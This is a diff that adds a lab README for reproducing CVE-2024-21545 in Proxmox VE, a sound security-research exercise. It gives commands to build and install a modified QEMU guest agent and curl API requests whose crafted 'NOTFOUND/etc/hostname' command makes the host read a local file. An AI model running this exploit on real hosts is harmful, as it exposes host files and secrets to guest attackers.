@@ -1,0 +1,155 @@
+# Proxmox VE CVE-2024-21545 API demo
+
+This lab documents a controlled reproduction of CVE-2024-21545 against a
+vulnerable Proxmox VE test node. The demo uses a modified QEMU Guest Agent
+source file, `main.c`, to show how a compromised guest agent can return a
+crafted `download` object to the Proxmox API and make the host read a local
+file.
+
+The proof is intentionally narrow:
+
+- the attacker already has root access inside the guest VM;
+- the Proxmox API account is authorized only for the test VM;
+- the trigger reads a known file from the Proxmox host;
+- the demo does not install persistence, modify host files, scan a network, or
+  attempt cluster takeover.
+
+The correct fix is to patch Proxmox VE. Mandatory access control can reduce
+impact, but it is not a substitute for the vendor fix.
+
+## Requirements
+
+Use an isolated Proxmox VE lab with:
+
+- a Proxmox VE version that is intentionally vulnerable to CVE-2024-21545;
+- one test VM with QEMU Guest Agent enabled;
+- root access inside that VM;
+- a Proxmox API user with the minimum VM permissions needed for guest-agent
+  commands, such as `VM.Monitor` on the test VM;
+- a Linux build host with the QEMU build dependencies.
+
+Install the build dependencies on a Debian or Ubuntu build host:
+
+```bash
+sudo apt update
+sudo apt install -y git build-essential pkg-config libglib2.0-dev flex bison libpixman-1-dev
+```
+
+## Build the patched guest agent
+
+Fetch the QEMU source used for the lab and replace `qga/main.c` with the patched
+file from this directory:
+
+```bash
+git clone https://gitlab.com/qemu-project/qemu.git
+cd qemu
+git checkout v10.2.1
+cp /path/to/cns-codeexamples/apiAttack/main.c qga/main.c
+./configure --enable-guest-agent --enable-debug
+make -j"$(nproc)" qemu-ga
+```
+
+The patch changes `send_response()` so that a guest-agent error containing a
+command name like `NOTFOUND/etc/hostname` is rewritten as:
+
+```json
+{"return":{"download":{"path":"/etc/hostname","content-type":"text/plain"}}}
+```
+
+On a vulnerable Proxmox host, the API handles that `download` object as a host
+file read.
+
+## Install in the test VM
+
+Copy the patched guest-agent binary into the guest VM and restart the service:
+
+```bash
+scp build/qga/qemu-ga root@<vm-ip>:/tmp/qemu-ga.patched
+ssh root@<vm-ip>
+cp /usr/sbin/qemu-ga /usr/sbin/qemu-ga.original
+install -m 0755 /tmp/qemu-ga.patched /usr/sbin/qemu-ga
+systemctl restart qemu-guest-agent
+```
+
+Verify that the patched binary is running:
+
+```bash
+strings /usr/sbin/qemu-ga | grep CVE-2024-21545
+journalctl -u qemu-guest-agent -n 50
+```
+
+## Run the API trigger
+
+Authenticate to the Proxmox API and keep the returned ticket and CSRF token:
+
+```bash
+curl -k \
+  -d "username=<user>@<realm>&password=<password>" \
+  "https://<proxmox-host>:8006/api2/json/access/ticket"
+```
+
+Send a guest-agent command that fails inside the VM and embeds the host file
+path after `NOTFOUND`. Use a non-sensitive file first, such as
+`/etc/hostname`, to confirm the lab behavior:
+
+```bash
+curl -k \
+  -b "PVEAuthCookie=<ticket>" \
+  -H "CSRFPreventionToken: <csrf-token>" \
+  -X POST \
+  "https://<proxmox-host>:8006/api2/json/nodes/<node>/qemu/<vmid>/agent/exec" \
+  -d "command=NOTFOUND/etc/hostname"
+```
+
+## Expected result
+
+On a vulnerable host, the Proxmox API response contains the contents of
+`/etc/hostname` from the Proxmox host, not from the guest VM. The guest-agent
+log should show the patched response path:
+
+```bash
+journalctl -u qemu-guest-agent -f
+```
+
+Expected debug line:
+
+```text
+[CVE-2024-21545] Reading file: /etc/hostname
+```
+
+If the Proxmox host is fixed, the API should not return the host file. If the
+patched guest agent is not running, the request should behave like a normal
+failed `guest-exec` call.
+
+## Cleanup
+
+Restore the original guest-agent binary in the test VM:
+
+```bash
+ssh root@<vm-ip>
+install -m 0755 /usr/sbin/qemu-ga.original /usr/sbin/qemu-ga
+systemctl restart qemu-guest-agent
+```
+
+Remove any temporary build artifacts or VM snapshots according to your lab
+process.
+
+## Notes on AppArmor and SELinux
+
+CVE-2024-21545 is an API trust-boundary issue, so the primary remediation is the
+Proxmox security update. Additional controls still matter:
+
+- keep guest-agent permissions scoped to the smallest possible set of users and
+  VMs;
+- avoid granting broad `VM.Monitor` or `Sys.Audit` access to untrusted users;
+- use AppArmor or SELinux policy to limit what Proxmox services can read where
+  practical;
+- monitor Proxmox API and guest-agent logs for unexpected guest-agent command
+  failures or `download` responses.
+
+## References
+
+- Snyk Labs, "Proxmox VE CVE-2024-21545: Tricking the API":
+  https://labs.snyk.io/resources/proxmox-ve-cve-2024-21545-tricking-the-api/
+- NVD CVE-2024-21545:
+  https://nvd.nist.gov/vuln/detail/CVE-2024-21545
